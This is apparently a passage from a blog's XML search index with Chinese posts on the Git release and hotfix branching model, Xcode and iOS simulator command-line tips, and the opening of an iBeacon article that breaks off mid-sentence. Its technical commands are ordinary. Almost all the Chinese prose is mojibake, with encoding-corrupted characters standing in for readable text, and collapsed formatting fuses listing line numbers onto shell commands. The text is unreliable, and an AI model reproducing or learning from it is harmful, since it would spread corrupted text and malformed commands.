--no-ffå‚æ•°çš„ä½œç”¨æ˜¯åœ¨åˆå¹¶çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æäº¤å¯¹è±¡ï¼Œå³ä½¿æ˜¯fast-forwardæ–¹å¼çš„åˆå¹¶ã€‚è¿™å°±é¿å…äº†ä¸¢å¤±åŠŸèƒ½åˆ†æ”¯çš„åŽ†å²è®°å½•ä¿¡æ¯ä»¥åŠæäº¤è®°å½•ä¿¡æ¯ã€‚æ¯”è¾ƒä¸€ä¸‹ åœ¨åŽé¢çš„ä¾‹å­ä¸­ï¼Œæ˜¯ä¸å¯èƒ½ä»ŽGitåŽ†å²è®°å½•ä¸­çœ‹åˆ°ä¸€ä¸ªå·²ç»å®žçŽ°äº†çš„åŠŸèƒ½çš„æ‰€æœ‰æäº¤å¯¹è±¡-é™¤éžä½ åŽ»æŸ¥çœ‹æ‰€æœ‰çš„æ—¥å¿—ä¿¡æ¯ã€‚è¦æƒ³èŽ·å–æ•´ä¸ªåŠŸèƒ½åˆ†æ”¯ä¿¡æ¯ï¼Œåœ¨å³é¢çš„ä¾‹å­ä¸­çš„ç¡®æ˜¯ä¸€ä¸ªå¤´ç–¼çš„é—®é¢˜ï¼Œä½†æ˜¯å¦‚æžœä½¿ç”¨--no-ffå‚æ•°å°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚ ä½¿ç”¨è¿™ä¸ªå‚æ•°åŽï¼Œçš„ç¡®åˆ›å»ºäº†ä¸€äº›æ–°çš„æäº¤å¯¹è±¡(é‚£æ€•æ˜¯ç©ºæäº¤å¯¹è±¡)ï¼Œä½†æ˜¯å¾ˆå€¼å¾—ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘è¿˜æ²¡æœ‰æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä½¿Gité»˜è®¤çš„mergeæ“ä½œå¸¦ç€--no-ffå‚æ•°ï¼Œä½†çš„ç¡®åº”è¯¥è¿™æ ·ã€‚ å‘å¸ƒåˆ†æ”¯ ä»Ždevelopåˆ†æ”¯åŽ»å»ºç«‹Releaseåˆ†æ”¯ï¼ŒReleaseåˆ†æ”¯å¿…é¡»åˆå¹¶åˆ°developåˆ†æ”¯å’Œmasteråˆ†æ”¯ï¼ŒReleaseåˆ†æ”¯åå¯ä»¥è¿™æ ·èµ·å:release-*ã€‚ Releaseåˆ†æ”¯ç”¨äºŽæ”¯æŒä¸€ä¸ªæ–°ç‰ˆæœ¬çš„å‘å¸ƒã€‚ä»–ä»¬å…è®¸åœ¨æœ€åŽæ—¶åˆ»è¿›è¡Œä¸€äº›å°ä¿®å°æ”¹ã€‚ç”šè‡³å…è®¸è¿›è¡Œä¸€äº›å°bugçš„ä¿®æ”¹ï¼Œä¸ºæ–°ç‰ˆæœ¬çš„å‘å¸ƒå‡†è¦ä¸€äº›å…ƒæ•°æ®(ç‰ˆæœ¬å·ï¼Œæž„å»ºæ—¶é—´ç­‰)ã€‚é€šè¿‡åœ¨releaseåˆ†æ”¯å®Œæˆè¿™äº›å·¥ä½œï¼Œdevelopåˆ†æ”¯å°†ä¼šåˆå¹¶è¿™äº›ç‰¹æ€§ä»¥å¤‡ä¸‹ä¸€ä¸ªå¤§ç‰ˆæœ¬çš„å‘å¸ƒã€‚ ä»Ždevelopåˆ†æ”¯æ‹‰å–æ–°çš„releaseåˆ†æ”¯çš„æ—¶é—´ç‚¹æ˜¯å½“å¼€å‘å·¥ä½œå·²ç»è¾¾åˆ°äº†æ–°ç‰ˆæœ¬çš„æœŸæœ›å€¼ã€‚è‡³å°‘åœ¨è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œä¸‹ä¸€ç‰ˆæœ¬å‡†å¤‡å‘å¸ƒçš„æ‰€æœ‰ç›®æ ‡ç‰¹æ€§å¿…é¡»å·²ç»åˆå¹¶åˆ°äº†developåˆ†æ”¯ã€‚æ›´è¿œç‰ˆæœ¬çš„ç›®æ ‡ç‰¹æ€§ä¸å¿…åˆå¹¶ä¼šdevelopåˆ†æ”¯ã€‚è¿™äº›ç‰¹æ€§å¿…é¡»ç­‰åˆ°ä¸ªæ€§åˆ†æ”¯åˆ›å»ºåŽï¼Œæ‰èƒ½åˆå¹¶å›ždevelopåˆ†æ”¯ åœ¨releaseåˆ†æ”¯åˆ›å»ºå¥½åŽï¼Œå°±ä¼šèŽ·å–åˆ°ä¸€ä¸ªåˆ†é…å¥½å³å°†å‘å¸ƒçš„ç‰ˆæœ¬å·ï¼Œä¸èƒ½æ›´æ—©ï¼Œå°±åœ¨è¿™ä¸ªæ—¶é—´ç‚¹ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œdevelopåˆ†æ”¯ä»£ç ååº”å‡ºäº†ä¸‹ä¸€ç‰ˆæœ¬çš„ä»£ç å˜æ›´ï¼Œä½†æ˜¯åˆ°åº•ä¸‹ä¸€ç‰ˆæœ¬æ˜¯ 0.3 è¿˜æ˜¯ 1.0ï¼Œä¸æ˜¯å¾ˆæ˜Žç¡®ï¼Œç›´åˆ°releaseåˆ†æ”¯è¢«å»ºç«‹åŽä¸€åˆ‡éƒ½ç¡®å®šäº†ã€‚è¿™äº›å†³å®šåœ¨releaseåˆ†æ”¯å¼€å§‹å»ºç«‹ï¼Œé¡¹ç›®ç‰ˆæœ¬å·ç­‰é¡¹ç›®è§„åˆ™å‡ºæ¥åŽå°±ä¼šåšå‡ºã€‚ åˆ›å»ºreleaseåˆ†æ”¯ ä»Ždevelopåˆ†æ”¯åˆ›å»ºreleaseåˆ†æ”¯ã€‚ä¾‹å¦‚1.1.5ç‰ˆæœ¬æ˜¯å½“å‰äº§å“çš„å‘å¸ƒç‰ˆæœ¬ï¼Œæˆ‘ä»¬å³å°†å‘å¸ƒä¸€ä¸ªæ›´å¤§çš„ç‰ˆæœ¬ã€‚developåˆ†æ”¯æ­¤æ—¶å·²ç»ä¸ºä¸‹ä¸€ç‰ˆæœ¬å‡†å¤‡å¥½äº†ï¼Œæˆ‘ä»¬å†³å®šä¸‹ä¸€ç‰ˆçš„ç‰ˆæœ¬å·æ˜¯1.2(1.1.6æˆ–è€…2.0ä¹Ÿå¯ä»¥)ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ›å»ºreleaseåˆ†æ”¯ï¼Œå¹¶ç»™åˆ†æ”¯èµ‹äºˆæ–°çš„ç‰ˆæœ¬å·: 1234567$ git checkout -b release-1.2 developSwitched to a new branch "release-1.2"$ ./bump-version.sh 1.2Files modified successfully, version bumped to 1.2.$ git commit -a -m "Bumped version number to 1.2"[release-1.2 74d9424] Bumped version number to 1.21 files changed, 1 insertions(+), 1 deletions(-) åˆ›å»ºå¥½åˆ†æ”¯å¹¶åˆ‡åˆ°è¿™ä¸ªåˆ†æ”¯åŽï¼Œæˆ‘ä»¬ç»™åˆ†æ”¯æ‰“ä¸Šç‰ˆæœ¬å·ã€‚bump-version.shæ˜¯ä¸€ä¸ªè™šæž„çš„shellè„šæœ¬ï¼Œå®ƒæ›´æ”¹äº†å·¥ä½œç©ºé—´çš„æŸäº›æ–‡ä»¶æ¥åæ˜ æ–°ç‰ˆæœ¬ç‰¹å¾ã€‚(å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ”¹å˜è¿™äº›æ–‡ä»¶)ï¼Œç„¶åŽç‰ˆæœ¬å°±è¢«æäº¤äº†ã€‚ æ–°çš„åˆ†æ”¯ä¼šå­˜åœ¨ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°æ–°ç‰ˆæœ¬æœ€ç»ˆå‘å¸ƒã€‚åœ¨è¿™æ®µæ—¶é—´é‡Œï¼Œbugçš„è§£å†³å¯ä»¥åœ¨è¿™ä¸ªåˆ†æ”¯è¿›è¡Œ(ä¸è¦åœ¨developåˆ†æ”¯è¿›è¡Œ)ã€‚æ­¤æ—¶æ˜¯ä¸¥ç¦æ·»åŠ æ–°çš„å¤§ç‰¹æ€§ã€‚è¿™äº›ä¿®æ”¹å¿…é¡»åˆå¹¶å›ždevelopåˆ†æ”¯ï¼Œä¹‹åŽå°±ç­‰å¾…æ–°ç‰ˆæœ¬çš„å‘å¸ƒã€‚ å®Œæˆä¸€ä¸ªreleaseåˆ†æ”¯ å½“releaseåˆ†æ”¯çš„å‡†å¤‡æˆä¸ºä¸€ä¸ªçœŸæ­£çš„å‘å¸ƒç‰ˆæœ¬æ—¶ï¼Œä¸€äº›æ“ä½œå¿…é¡»éœ€è¦æ‰§è¡Œã€‚é¦–å…ˆï¼Œå°†releaseåˆ†æ”¯åˆå¹¶å›žmasteråˆ†æ”¯(å› ä¸ºmasteråˆ†æ”¯çš„æ¯ä¸€æ¬¡æäº¤éƒ½æ˜¯é¢„å…ˆå®šä¹‰å¥½çš„ä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œè°¨è®°)ã€‚ç„¶åŽä¸ºè¿™æ¬¡æäº¤æ‰“tagï¼Œä¸ºå°†æ¥åŽ»æŸ¥çœ‹åŽ†å²ç‰ˆæœ¬ã€‚æœ€åŽåœ¨releaseåˆ†æ”¯åšçš„æ›´æ”¹ä¹Ÿåˆå¹¶åˆ°developåˆ†æ”¯ï¼Œè¿™æ ·çš„è¯ï¼Œå°†æ¥çš„å…¶ä»–ç‰ˆæœ¬ä¹Ÿä¼šåŒ…å«è¿™äº›å·²ç»è§£å†³äº†çš„bugã€‚ åœ¨Gitä¸­éœ€è¦ä¸¤æ­¥å®Œæˆ: 123456$ git checkout masterSwitched to branch 'master'$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes)$ git tag -a 1.2 è¿™æ ·releaseåˆ†æ”¯å·²ç»å®Œæˆå·¥ä½œï¼Œtagä¹Ÿå·²ç»æ‰“äº†ã€‚ å¤‡æ³¨:ä½ å¯ä»¥ä½¿ç”¨-s or -u å‚æ•°ä¸ºä½ çš„tagè®¾ç½®æ ‡ç­¾ç­¾åã€‚ ä¸ºäº†ä¿å­˜è¿™äº›åœ¨releaseåˆ†æ”¯æ‰€åšçš„å˜æ›´ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™äº›å˜æ›´åˆå¹¶å›ždevelopåˆ†æ”¯ã€‚æ‰§è¡Œå¦‚ä¸‹Gitå‘½ä»¤: 12345$ git checkout developSwitched to branch 'develop'$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes) è¿™æ­¥æœ‰å¯èƒ½ä¼šæœ‰åˆå¹¶å†²çª(æžæœ‰å¯èƒ½ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»æ”¹å˜äº†ç‰ˆæœ¬å·)ã€‚å¦‚æžœæœ‰å†²çªï¼Œè§£å†³æŽ‰ä»–ï¼Œç„¶åŽæäº¤ã€‚ çŽ°åœ¨æˆ‘ä»¬å·²ç»å®Œæˆäº†å·¥ä½œï¼Œreleaseåˆ†æ”¯å¯ä»¥åˆ é™¤äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸åœ¨éœ€è¦ä»–: 12$ git branch -d release-1.2Deleted branch release-1.2 (was ff452fe). Hotfixåˆ†æ”¯ Hotfixåˆ†æ”¯ä»Žmasteråˆ†æ”¯å»ºç«‹ï¼Œå¿…é¡»åˆå¹¶å›ždevelopåˆ†æ”¯å’Œmasteråˆ†æ”¯ï¼Œä¸ºHotfixåˆ†æ”¯å¯ä»¥è¿™æ ·èµ·å:hotfix-* Hotfixåˆ†æ”¯åœ¨æŸç§ç¨‹åº¦ä¸Šéžå¸¸åƒreleaseåˆ†æ”¯ï¼Œä»–ä»¬éƒ½æ„å‘³ç€ä¸ºæŸä¸ªæ–°ç‰ˆæœ¬å‘å¸ƒåšå‡†å¤‡ï¼Œå¹¶ä¸”éƒ½æ˜¯é¢„å…ˆä¸å¯çŸ¥çš„ã€‚Hotfixåˆ†æ”¯æ˜¯åŸºäºŽå½“å‰ç”Ÿäº§çŽ¯å¢ƒçš„äº§å“çš„ä¸€ä¸ªbugæ€¥éœ€è§£å†³è€Œå¿…é¡»åˆ›å»ºçš„ã€‚å½“æŸä¸ªç‰ˆæœ¬çš„äº§å“æœ‰ä¸€ä¸ªä¸¥é‡bugéœ€è¦ç«‹å³è§£å†³ï¼ŒHotfixåˆ†æ”¯éœ€è¦ä»Žmasteråˆ†æ”¯ä¸Šè¯¥ç‰ˆæœ¬å¯¹åº”çš„tagä¸Šè¿›è¡Œå»ºç«‹ï¼Œå› ä¸ºè¿™ä¸ªtagæ ‡è®°äº†äº§å“ç‰ˆæœ¬ åˆ›å»ºhotfixåˆ†æ”¯ Hotfixåˆ†æ”¯ä»Žmasteråˆ†æ”¯è¿›è¡Œåˆ›å»ºã€‚ä¾‹å¦‚å½“å‰çº¿ä¸Š1.2ç‰ˆæœ¬äº§å“å› ä¸ºserverç«¯çš„ä¸€ä¸ªBugå¯¼è‡´ç³»ç»Ÿæœ‰é—®é¢˜ã€‚ä½†æ˜¯åœ¨developåˆ†æ”¯è¿›è¡Œæ›´æ”¹æ˜¯ä¸é è°±çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»ºç«‹hotfixåˆ†æ”¯ï¼Œç„¶åŽå¼€å§‹è§£å†³é—®é¢˜: 1234567$ git checkout -b hotfix-1.2.1 masterSwitched to a new branch "hotfix-1.2.1"$ ./bump-version.sh 1.2.1Files modified successfully, version bumped to 1.2.1.$ git commit -a -m "Bumped version number to 1.2.1"[hotfix-1.2.1 41e61bb] Bumped version number to 1.2.11 files changed, 1 insertions(+), 1 deletions(-) åƒä¸‡åˆ«å¿˜è®°åœ¨åˆ›å»ºåˆ†æ”¯åŽä¿®æ”¹ç‰ˆæœ¬å·ã€‚ ç„¶åŽè§£å†³æŽ‰bugï¼Œæäº¤ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ 123$ git commit -m "Fixed severe production problem"[hotfix-1.2.1 abbe5d6] Fixed severe production problem5 files changed, 32 insertions(+), 17 deletions(-) ç»“æŸhotfixåˆ†æ”¯ å®Œæˆå·¥ä½œåŽï¼Œè§£å†³æŽ‰çš„bugä»£ç éœ€è¦åˆå¹¶å›žmasteråˆ†æ”¯ï¼Œä½†åŒæ—¶ä¹Ÿéœ€è¦åˆå¹¶åˆ°developåˆ†æ”¯ï¼Œç›®çš„æ˜¯ä¿è¯åœ¨ä¸‹ä¸€ç‰ˆä¸­è¯¥bugå·²ç»è¢«è§£å†³ã€‚è¿™å¤šä¹ˆåƒreleaseåˆ†æ”¯å•Šã€‚ é¦–å…ˆï¼Œå¯¹masteråˆ†æ”¯è¿›è¡Œåˆå¹¶æ›´æ–°ï¼Œç„¶åŽæ‰“tag å¤‡æ³¨:ä½ å¯ä»¥ä½¿ç”¨-s or -u å‚æ•°ä¸ºä½ çš„tagè®¾ç½®æ ‡ç­¾ç­¾åã€‚ 123456$ git checkout masterSwitched to branch 'master'$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes)$ git tag -a 1.2.1 ç´§æŽ¥ç€ï¼Œåœ¨developåˆ†æ”¯åˆå¹¶bugfixä»£ç  12345$ git checkout developSwitched to branch 'develop'$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes) è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€äº›å¼‚å¸¸æƒ…å†µï¼Œå½“ä¸€ä¸ªreleaseåˆ†æ”¯å­˜åœ¨æ—¶ï¼Œhotfix åˆ†æ”¯éœ€è¦åˆå¹¶åˆ°release åˆ†æ”¯ï¼Œè€Œä¸æ˜¯developåˆ†æ”¯ã€‚å½“releaseåˆ†æ”¯çš„ä½¿å‘½å®ŒæˆåŽï¼Œåˆå¹¶å›žreleaseåˆ†æ”¯çš„bugfixä»£ç æœ€ç»ˆä¹Ÿä¼šè¢«åˆå¹¶åˆ°developåˆ†æ”¯ã€‚(å½“developåˆ†æ”¯æ€¥éœ€è§£å†³è¿™äº›bugï¼Œè€Œç­‰ä¸åˆ°releaseåˆ†æ”¯çš„ç»“æŸï¼Œä½ å¯ä»¥å®‰å…¨çš„å°†è¿™äº›bugfixä»£ç åˆå¹¶åˆ°developåˆ†æ”¯ï¼Œè¿™æ ·åšä¹Ÿæ˜¯å¯ä»¥çš„)ã€‚ æœ€åŽåˆ é™¤è¿™äº›ä¸´æ—¶åˆ†æ”¯ 12$ git branch -d hotfix-1.2.1Deleted branch hotfix-1.2.1 (was abbe5d6). æ€»ç»“ è¿™ä¸ªåˆ†æ”¯æ¨¡åž‹å…¶å®žæ²¡æœ‰ä»€ä¹ˆéœ‡æ’¼äººå¿ƒçš„æ–°ä¸œè¥¿ï¼Œè¿™ç¯‡æ–‡ç« å¼€å§‹çš„é‚£ä¸ªâ€œæœ€å¤§å›¾ç‰‡â€å·²ç»è¯æ˜Žäº†ä»–åœ¨æˆ‘ä»¬å·¥ç¨‹é¡¹ç›®ä¸­çš„å·¨å¤§ä½œç”¨ã€‚å®ƒä¼šå½¢æˆä¸€ç§ä¼˜é›…çš„ç†æƒ³æ¨¡åž‹ï¼Œè€Œä¸”å¾ˆå®¹æ˜“ç†è§£ï¼Œè¯¥æ¨¡åž‹ä¹Ÿå…è®¸å›¢é˜Ÿæˆå‘˜å½¢æˆä¸€ä¸ªå…³äºŽåˆ†æ”¯å’Œç‰ˆæœ¬å‘å¸ƒè¿‡ç¨‹çš„ç›¸åŒç†å¿µã€‚ è¿™é‡Œæœ‰æä¾›ä¸€ä¸ªé«˜è´¨é‡çš„åˆ†æ”¯æ¨¡åž‹å›¾çš„PDFç‰ˆæœ¬ã€‚åŽ»å§ï¼ŒæŠŠå®ƒæŒ‚åœ¨å¢™ä¸Šéšæ—¶å¿«é€Ÿå‚è€ƒã€‚ Git-åˆ†æ”¯-æ¨¡åž‹.pdf æ›´æ–°ï¼šä»»ä½•éœ€è¦çš„å°ä¼™ä¼´ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªåŽŸå›¾çš„gitflow-model.src.keyæ–‡ä»¶ã€‚ å‚è€ƒ A successful Git branching model]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æœ€ä½³çš„iOSå¼€å‘æŠ€å·§åŠå°çªé—¨]]></title>
    <url>%2Farchives%2Fed90488b.html</url>
    <content type="text"><![CDATA[æˆ‘é€‰æ‹©æ²‰é»˜çš„ä¸»è¦åŽŸå› ä¹‹ä¸€ï¼šä»Žè¯è¯­ä¸­ï¼Œä½ å¾ˆå°‘èƒ½å­¦åˆ°äººæ€§ï¼Œä»Žæ²‰é»˜ä¸­å´èƒ½ã€‚å‡å¦‚è¿˜æƒ³å­¦å¾—æ›´å¤šï¼Œé‚£å°±è¦ç»§ç»­ä¸€å£°ä¸å­ ã€‚â€”â€”çŽ‹å°æ³¢ã€Šæ²‰é»˜çš„å¤§å¤šæ•°ã€‹ å‰è¨€ æœ¬æ–‡ç¿»è¯‘è‡ªâ€œBest iOS Development Tips and Tricksâ€ è‹±æ–‡åŽŸæ–‡è¯·ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹ è¯‘è€…æ³¨ï¼šæ–‡ä¸­éƒ¨åˆ†åŠŸèƒ½æ¶‰åŠåˆ°è§†é¢‘æ¼”ç¤ºï¼Œè§†é¢‘æ¥æºYouTubeï¼Œè¯·è‡ªå¤‡æ¢¯å­ã€‚ æ­£æ–‡1ã€å¦‚æžœä½ æƒ³çŸ¥é“é¡¹ç›®çš„ç¡®åˆ‡æž„å»ºæ—¶é—´ï¼Œè¯·ç”¨ä¸‹é¢æŒ‡ä»¤å¼€å¯Xcodeçš„ç›¸å…³åŠŸèƒ½ã€‚1defaults write com.apple.dt.Xcode ShowBuildOperationDuration -bool YES 2ã€ æå‡ä½ Swifté¡¹ç›®çš„æž„å»ºæ—¶é—´ åœ¨Xcode 9.2çš„å‘å¸ƒè¯´æ˜Žä¸­æåˆ°ä¸€ä¸ªå¯ä»¥æå‡Swifté¡¹ç›®æž„å»ºæ—¶é—´çš„åŠŸèƒ½ï¼ˆå¤„äºŽå®žéªŒé˜¶æ®µï¼‰ï¼Œä½¿ç”¨buildsystemscheduleinherentlyparallelcommandclutlyç”¨æˆ·é»˜è®¤å€¼å¯ç”¨ã€‚ 1defaults write com.apple.dt.Xcode BuildSystemScheduleInherentlyParallelCommandsExclusively -bool NO æç¤ºï¼šæ ¹æ®å‘å¸ƒè¯´æ˜Žè¿™æ˜¯ä¸€ä¸ªè¯•éªŒé˜¶æ®µçš„åŠŸèƒ½ï¼Œä¼šå¯¼è‡´æž„å»ºé˜¶æ®µå†…å­˜æ¶ˆè€—å¢žåŠ ã€‚ 3ã€æ¨¡æ‹Ÿå™¨å’ŒXcodeåœ¨å…¨å±æ¨¡å¼ä¸‹å…±å­˜ èƒ½åœ¨å…¨å±æ¨¡å¼ä¸‹åŒæ—¶ä½¿ç”¨Xcodeå’ŒiOSæ¨¡æ‹Ÿå™¨ï¼Œå¯èƒ½æ˜¯æˆ‘åœ¨Xcode9æœ€å–œæ¬¢çš„ä¸€ä¸ªåŠŸèƒ½ã€‚ä½ åªéœ€è¦åœ¨ç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤å¼€å¯ 1defaults write com.apple.iphonesimulator AllowFullscreenMode -bool YES å¦‚æžœä½ æƒ³ä½¿ç”¨æ›´å¤šçš„æ¨¡æ‹Ÿå™¨çš„ç§˜å¯†åŠŸèƒ½ï¼Œè¯·å¼€å¯è‹¹æžœéšè—çš„å†…éƒ¨èœå•æ ï¼Œä½ éœ€è¦åœ¨ç”¨æˆ·æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªåå­—ä¸ºAppleInternalçš„ç©ºæ–‡ä»¶å¤¹ï¼Œç„¶åŽæ‰§è¡Œä¸‹é¢æŒ‡ä»¤é‡å¯æ¨¡æ‹Ÿå™¨å³å¯ã€‚ 1sudo mkdir /AppleInternal æ–°çš„èœå•æ å°±ä¼šå‡ºçŽ° 4ã€iOSæ¨¡æ‹Ÿå™¨å½•åˆ¶è§†é¢‘ ä½ å¯ä»¥ä½¿ç”¨xcrun command-lineå·¥å…·æˆªå–æ¨¡æ‹Ÿå±å¹•å¿«ç…§æˆ–è€…å½•åˆ¶æ¨¡æ‹Ÿå™¨å±å¹•è§†é¢‘ã€‚ å½•åˆ¶è§†é¢‘è¯·æ‰§è¡Œä¸‹é¢æŒ‡ä»¤ 1xcrun simctl io booted recordVideo &lt;æ–‡ä»¶å&gt;.&lt;æ–‡ä»¶åŽç¼€&gt;. ä¾‹å¦‚ï¼š 1xcrun simctl io booted recordVideo appvideo.mov å¿«æ·é”®control + cåœæ­¢è§†é¢‘å½•åˆ¶ï¼Œå½•åˆ¶çš„é€‚é…æ–‡ä»¶é»˜è®¤ä¼šåœ¨å½“å‰ç›®å½•ä¿å­˜ã€‚ 5ã€ä»ŽFinderå…±äº«æ–‡ä»¶åˆ°iOSæ¨¡æ‹Ÿå™¨ ä»ŽXcode9å¼€å§‹ï¼Œæ¨¡æ‹Ÿå™¨å…è®¸ä½¿ç”¨Finderæ‰©å±•ç›´æŽ¥ä»ŽFinderçª—å£å…±äº«æ–‡ä»¶ã€‚ç„¶è€Œï¼Œæ‹–åŠ¨æ–‡ä»¶åˆ°æ¨¡æ‹Ÿå™¨æ”¾å¼€ä¼¼ä¹Žæ›´åŠ å¿«æ·ã€‚ ç„¶è€Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢simctlå‘½ä»¤åšä¸€äº›å’Œå›¾ç‰‡/è§†é¢‘æ–‡ä»¶ç›¸ä¼¼çš„äº‹æƒ…ã€‚ 1xcrun simctl addmedia booted &lt;PATH TO FILE&gt; 6ã€ä½¿ç”¨æŒ‡çº¹sudo å¦‚æžœä½ æƒ³ä½¿ç”¨æŒ‡çº¹ä½œä¸ºä½ Macbook Proæ‰§è¡Œsudoæ—¶çš„å¯†ç ï¼Œè¯·ç¼–è¾‘/etc/pam.d/sudoæ–‡ä»¶å°†ä¸‹é¢ä¸€è¡Œæ·»åŠ åœ¨æ–‡ä»¶ä¸Šé¢ã€‚ 1auth sufficient pam_tid.so çŽ°åœ¨ä½ å¯ä»¥ä½¿ç”¨æŒ‡çº¹æ‰§è¡Œsudoäº†ã€‚ 7ã€ä½¿ç”¨å£°éŸ³é€šçŸ¥è°ƒè¯•ä½ çš„è‡ªåŠ¨å¸ƒå±€çº¦æŸ è¿™å°†æ˜¯ä¸€ä¸ªéžå¸¸å¥½çš„æ–¹å¼åŽ»è°ƒè¯•è‡ªåŠ¨å¸ƒå±€çº¦æŸï¼Œä»…ä»…åœ¨å¯åŠ¨çš„æ—¶å€™ä¼ é€’UIConstraintBasedLayoutPlaySoundOnUnsatisfiableå‚æ•°ï¼Œå½“çº¦æŸåœ¨è¿è¡Œæ—¶å‡ºçŽ°ç³Ÿç³•æƒ…å†µçš„æ—¶å€™å°±ä¼šæ’­æ”¾å£°éŸ³ã€‚ 1-_UIConstraintBasedLayoutPlaySoundOnUnsatisfiable YES 8ã€ç§»é™¤Xcodeä¸­æ— æ•ˆçš„æ¨¡æ‹Ÿå™¨ è¿™ä¸ªå°å‘½ä»¤å°†ç§»é™¤Xcodeä¸­æ‰€æœ‰æ— æ•ˆçš„æ¨¡æ‹Ÿå™¨ï¼Œæ‰€è°“æ— æ•ˆæ˜¯æŒ‡å¯¹xcode-selectæ— æ•ˆçš„Xcodeç‰ˆæœ¬ã€‚ 1xcrun simctl delete unavailable ä½ æœ€å–œæ¬¢çš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿè¯·å‘Šè¯‰æˆ‘ã€‚]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>xCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSè“ç‰™å¼€å‘ä¹‹iBeaconç¯‡(äºŒ)]]></title>
    <url>%2Farchives%2Fb05dc691.html</url>
    <content type="text"><![CDATA[é‚£ä¸€å¤©æˆ‘äºŒåä¸€å²ï¼Œåœ¨æˆ‘ä¸€ç”Ÿçš„é»„é‡‘æ—¶ä»£ã€‚æˆ‘æœ‰å¥½å¤šå¥¢æœ›ã€‚æˆ‘æƒ³çˆ±ï¼Œæƒ³åƒï¼Œè¿˜æƒ³å†ä¸€çž¬é—´å˜æˆå¤©ä¸ŠåŠæ˜ŽåŠæš—çš„äº‘ã€‚æˆ‘æ¥æˆ‘æ‰çŸ¥é“ï¼Œç”Ÿæ´»å°±æ˜¯ä¸ªç¼“æ…¢å—é”¤çš„è¿‡ç¨‹ï¼Œäººä¸€å¤©å¤©è€ä¸‹åŽ»ï¼Œå¥¢æœ›ä¹Ÿä¸€å¤©å¤©æ¶ˆå¤±ï¼Œæœ€åŽå˜å¾—åƒæŒ¨äº†é”¤çš„ç‰›ä¸€æ ·ã€‚å¯æ˜¯æˆ‘è¿‡äºŒåä¸€å²ç”Ÿæ—¥æ—¶æ²¡æœ‰é¢„è§åˆ°è¿™ä¸€ç‚¹ã€‚æˆ‘è§‰å¾—è‡ªå·±ä¼šæ°¸è¿œç”ŸçŒ›ä¸‹åŽ»ï¼Œä»€ä¹ˆä¹Ÿé”¤ä¸äº†æˆ‘ã€‚â€”â€”çŽ‹å°æ³¢ã€Šé»„é‡‘æ—¶ä»£ã€‹ å‰è¨€ ç…§ä¾‹ï¼Œå¦‚æžœåªæ˜¯éœ€è¦ç›‘å¬iBeaconçš„demoä»£ç ï¼Œå¯ä»¥ç›´æŽ¥ç‚¹å‡»ä¸‹è½½ï¼Œä¸éœ€è¦å¾€ä¸‹çœ‹äº†ðŸ˜‚ å¦‚æžœæƒ³äº†è§£iBeaconç›¸å…³ä¿¡æ¯ï¼Œè¯·å‚è€ƒiOSè“ç‰™å¼€å‘ä¹‹iBeaconç¯‡(ä¸€) è™½ç„¶iBeaconä¹Ÿæ˜¯åŸºäºŽBleçš„ï¼Œä»Žç¡¬ä»¶ä¸Šçœ‹ä¹Ÿæ˜¯ä¸€å¥—ä¸œè¥¿ï¼Œä½†æ˜¯Appleå…¬å¸æŠŠä»–å°è£…æˆäº†ä¸¤å¥—ä¸œè¥¿ï¼Œæ‰€ä»¥åœ¨iOSç§»åŠ¨ç«¯å¼€å‘æ¥è¯´ï¼Œè¿™æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„ä¸œè¥¿ï¼Œè°ƒç”¨å®Œå…¨ä¸åŒæ¡†æž¶çš„api. Appleå…¬å¸ä¸ºäº†çœç”µå’Œéšç§é™åˆ¶åªèƒ½ç›‘å¬æŒ‡å®šUUIDçš„iBeaconï¼Œæ— æ³•åƒå®‰å“ä¸€æ ·æœç´¢é™„è¿‘æ‰€æœ‰çš„iBeaconä¿¡æ¯ï¼Œè™½ç„¶iBeaconæ‰«æåº•å±‚å¯ä»¥èŽ·å–åˆ°é™„è¿‘çš„æ‰€æœ‰çš„iBeaconä¿¡æ¯ï¼ˆåº•å±‚å°±æ˜¯èŽ·å–é™„è¿‘æ‰€æœ‰çš„iBeaconç„¶åŽå’Œå½“å‰ç›‘å¬çš„iBeaconæ ‡è¯†å¯¹æ¯”ï¼Œç„¶åŽå›žè°ƒç»™ä¸Šå±‚ï¼‰ï¼Œå¦‚æžœä½ åªæ˜¯æƒ³åœ¨ä½ è‡ªå·±çš„æ‰‹æœºä¸Šæµ‹è¯•ä¸‹ï¼Œå¯ä»¥å‚è€ƒAnyiBeacon-iOSè¿™ä¸ªé¡¹ç›®ï¼Œä½†æ˜¯åªèƒ½ä½œä¸ºæµ‹è¯•ä½¿ç”¨ï¼Œå› 